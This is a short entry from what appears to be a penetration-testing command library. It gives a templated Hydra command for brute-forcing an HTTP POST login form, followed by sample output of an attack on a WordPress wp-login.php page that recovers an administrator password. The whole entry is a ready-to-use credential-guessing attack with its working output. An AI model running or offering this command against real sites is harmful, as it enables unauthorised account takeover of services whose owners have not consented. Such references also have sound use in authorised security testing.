---
id: 520b3767-478c-4a10-8467-b33009caaf2c
name: Hydra Brute Force a HTTP POST Login Form
type: command
executor: bash
data: hydra -L $_USERNAME_LIST -P $_PASSWORD_LIST $_TARGET_IP http-post-form '$_PATH:$_POST_DATA:$_NEGATIVE_RESULT'
output: 'root@kali:~# hydra -L users.txt -P wordlist.txt 10.10.10.10  http-post-form
  ''/wp-login.php:log=^USER^&pwd=^PASS^&rememberme=forever&wp-submit=Log+In:incorrect''

  Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret
  service organizations, or for illegal purposes.


  Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-09-24 20:27:03

  [DATA] max 16 tasks per 1 server, overall 16 tasks, 104 login tries (l:1/p:104),
  ~7 tries per task

  [DATA] attacking http-post-form://10.10.10.10:80/wp-login.php:log=^USER^&pwd=^PASS^&rememberme=forever&wp-submit=Log+In:incorrect

  [80][http-post-form] host: 10.10.10.10   login: admin   password: secret!!!

  1 of 1 target successfully completed, 1 valid password found

  Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-09-24 20:27:24'
created_at: '2019-09-25T02:38:27.477012+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Hydra Brute Force a HTTP POST Login Form

```bash
hydra -L $_USERNAME_LIST -P $_PASSWORD_LIST $_TARGET_IP http-post-form '$_PATH:$_POST_DATA:$_NEGATIVE_RESULT'
```

## Expected Output

```
root@kali:~# hydra -L users.txt -P wordlist.txt 10.10.10.10  http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&rememberme=forever&wp-submit=Log+In:incorrect'
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-09-24 20:27:03
[DATA] max 16 tasks per 1 server, overall 16 tasks, 104 login tries (l:1/p:104), ~7 tries per task
[DATA] attacking http-post-form://10.10.10.10:80/wp-login.php:log=^USER^&pwd=^PASS^&rememberme=forever&wp-submit=Log+In:incorrect
[80][http-post-form] host: 10.10.10.10   login: admin   password: secret!!!
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-09-24 20:27:24
```


